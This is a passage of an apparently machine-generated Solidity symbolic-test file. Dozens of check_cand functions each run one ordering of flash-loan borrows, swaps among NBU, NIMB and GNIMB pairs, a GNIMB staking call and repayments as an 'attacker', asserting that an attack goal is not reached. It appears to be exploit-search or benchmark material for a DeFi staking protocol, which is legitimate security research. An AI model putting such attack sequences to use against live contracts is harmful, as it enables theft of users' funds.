        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5471(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5472(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5473(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5474(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5475(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5476(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5477(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5478(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5479(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5480(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5481(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5482(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5483(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5484(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5485(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5486(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5487(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5488(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5489(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5490(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5491(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5492(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5493(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5494(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5495(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5496(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5497(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5498(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5499(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5500(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5501(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5502(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5503(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5504(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5505(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5506(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5507(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5508(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5509(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5510(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5511(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5512(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5513(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5514(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5515(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
